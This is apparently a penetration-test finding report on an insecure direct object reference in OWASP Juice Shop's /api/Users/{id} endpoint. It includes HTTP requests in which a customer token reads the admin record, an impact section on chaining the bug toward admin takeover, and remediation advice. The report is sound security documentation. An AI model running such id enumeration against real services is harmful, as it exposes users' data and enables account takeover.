# IDOR on /api/Users/{id} — admin record readable with customer token

- **Severity:** high
- **Date (UTC):** 2026-11-19

## Details

## Summary
`GET /api/Users/{id}` returns any user's record to any authenticated caller — no ownership or role check. A customer-role JWT (id=26) retrieves the admin row (id=1, role=admin, email=admin@juice-sh.op).

## Steps to reproduce
1. Register + log in a low-priv test user → receive JWT with `data.id=26, role=customer`.
2. `GET /api/Users/26` with the customer token — returns own record (control).
3. `GET /api/Users/1` with the same customer token — returns admin record.

## Evidence
Request (own record, control):
```http
GET /api/Users/26 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <customer-jwt>
```
Response:
```json
{"status":"success","data":{"id":26,"username":"pentest","email":"pentest-juice-shop@example.com","role":"customer","isActive":true,...}}
```

Request (admin target):
```http
GET /api/Users/1 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <customer-jwt>
```
Response:
```json
{"status":"success","data":{"id":1,"username":"","email":"admin@juice-sh.op","role":"admin","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-11-18T10:16:30.589Z",...}}
```

## Impact
Horizontal + cross-role read of the full user directory via sequential id enumeration. An attacker with any customer account enumerates:
- all admin email addresses → targeted credential-stuffing / password-reset abuse (chains with the unauthenticated security-question disclosure already filed in auth phase → full admin takeover path)
- every registered user's email, role, createdAt, profileImage, isActive flag
- a complete map of role boundaries in the system

Password hash is **not** returned on this endpoint (unlike `/rest/user/whoami`'s JWT payload), but role + email is sufficient to target admins for the auth-phase takeover chain.

## Remediation
Enforce at the controller:
- `req.user.data.id === :id` **or** `req.user.data.role === 'admin'` before returning the row.
- Default-deny on `/api/Users/{id}` for non-admin, non-self reads.
- Strip `role`, `isActive`, and internal timestamps from any non-admin response shape.

## References
- OWASP API Top 10 2023 — API1:2023 Broken Object Level Authorization
- CWE-639: Authorization Bypass Through User-Controlled Key
- Chains with `reports/2026-11-18-high-security-question-disclosure.md` (admin email discovered here → security question leaked unauth there → reset brute-force path).
